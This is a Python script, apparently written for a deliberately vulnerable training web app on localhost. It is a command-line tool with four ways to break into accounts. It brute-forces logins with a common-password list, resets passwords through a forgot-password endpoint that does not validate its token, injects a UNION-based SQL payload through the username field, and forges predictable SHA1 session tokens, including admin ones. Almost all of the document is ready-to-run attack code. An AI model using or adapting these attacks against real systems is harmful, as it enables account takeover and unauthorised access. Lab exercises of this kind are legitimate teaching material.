"""
Different methods to crack the login page:
1. Enumerate on passwords
2. Change the password using 'forgot password' flow (can also be done with postman)
3. Use SQL injection
4. Fake the token
"""
import requests
from hashlib import sha1

def login_with_password(username, password, server_url):
    """
    Login with a user and password
    """
    login_url = f'{server_url}/login'
    data = {'username': username,
            'passwd': password}
    resp = requests.get(login_url, params=data)
    if resp.status_code == 200:
        # Success!
        return resp.url

def enumerate_passwords(usernames, server_url='http://localhost:8080', passwords_file='200_common_passwd.txt'):
    """
    Enumerate login using the 200 most frequent passwords in the web
    :param usernames: List of strings of the usernames we want to enumerate on
    :param server_url: The URL for the server
    """
    login_url = f'{server_url}/login'
    # Read the passwords:
    passwords = open(passwords_file).read().split()
    # Add first-letter caps to the passwords:
    passwords += [p.capitalize() for p in passwords if p[0].islower()]

    # Try each password on each user.
    for passwd in passwords:
        passwd = passwd.strip()
        for user in usernames:
            data = {'username': user,
                    'passwd': passwd}
            resp = requests.get(login_url, params=data)
            if resp.status_code == 200:
                # Success!
                print("Found a password:")
                print(data)
                return resp.url

def change_password(user_id, new_password, server_url='http://localhost:8080'):
    """
    Change the password using the 'forgot password' flow. Since the flow doesn't validate the token (a logical bug) on
    the /user/<user_id>/<token>/submit_new_passwd endpoint. We give a dummy token, and submit the new password.
    Note that we don't know the user name in this case. But if we change a low ID value to a new password we can
    assume it is a real user, and try different values to find one that works.
    :param user_id: The user ID in the DB
    :param new_password: The new password we want to set
    :param server_url: The server URL
    """
    dummy_token = '12345'
    endpoint = f'{server_url}/user/{user_id}/{dummy_token}/submit_new_passwd'
    requests.get(endpoint, data={'passwd': new_password})

def login_sql_inject(username, server_url='http://localhost:8080'):
    """
    Use SQL injection on the login form. We inject using the user name field, which is what goes into the query
    :param username: The user name we want to login as
    :param server_url: The server URL
    """
    login_url = f'{server_url}/login'
    user = f"nosuchnameinthedb' UNION select id,name,'pass123',0,'Subaru', 'Haifa' from Users where name='{username}';  --"
    password = "pass123"
    resp = requests.get(login_url, params={'username': user, 'passwd': password})
    return resp.url

def login_generate_token(username, user_type='user', server_url='http://localhost:8080'):
    """
    Generate the token - the token uses only the username and user_id (using a hash). So we can enumerate the token
    options for a given username by just trying different user_ids
    :param username: The user name
    :param user_type: either 'user' or 'admin'
    :param server_url: The server URL
    """
    URL_STRUCTURE = "{server_url}/{user_type}/{token}/{path}"

    found_token = None
    for n in range(100):
        # Try to generate the token - it is taken from the server code:
        user_secret = sha1(f"{n}/{username}".encode("utf8")).hexdigest()
        token = f"{n}/{user_secret}"
        url = URL_STRUCTURE.format(server_url=server_url,
                                   user_type=user_type,
                                   token=token,
                                   path="products")
        resp = requests.get(url)
        if resp.status_code == 200:
            print(f"Found it! id={n}")
            found_token = token
            break
    return URL_STRUCTURE.format(server_url=server_url,
                                   user_type=user_type,
                                   token=found_token,
                                   path="products")

if __name__ == '__main__':
    # Try different login options
    # Parameters are: python login_crack.py [username] [method] [-u server URL]
    # method can be: enum, change, sql_inj, gen_token
    # server URL default is http://localhost:8080
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument('user', help='User name / user ID to crack', type=str)
    parser.add_argument('method', help='Method to use (enum / change / sql_inj / gen_token)', default="enum")
    parser.add_argument("-u", "--server_url", default="http://localhost:8080", help="Server base URL")
    parser.add_argument("-p", "--password", default="Secret1", help="Password to change to")
    args = parser.parse_args()

    if args.method=='enum':
        res = enumerate_passwords([args.user], args.server_url)
    elif args.method=='change':
        res = change_password(args.user, args.password, args.server_url)
    elif args.method=='sql_inj':
        res = login_sql_inject(args.user, args.server_url)
    elif args.method=='gen_token':
        user_type = 'user' if args.user!='admin' else 'admin'
        res = login_generate_token(args.user, user_type, server_url=args.server_url)
    else:
        raise Exception("Unknown method ", args.method)
    print(res)
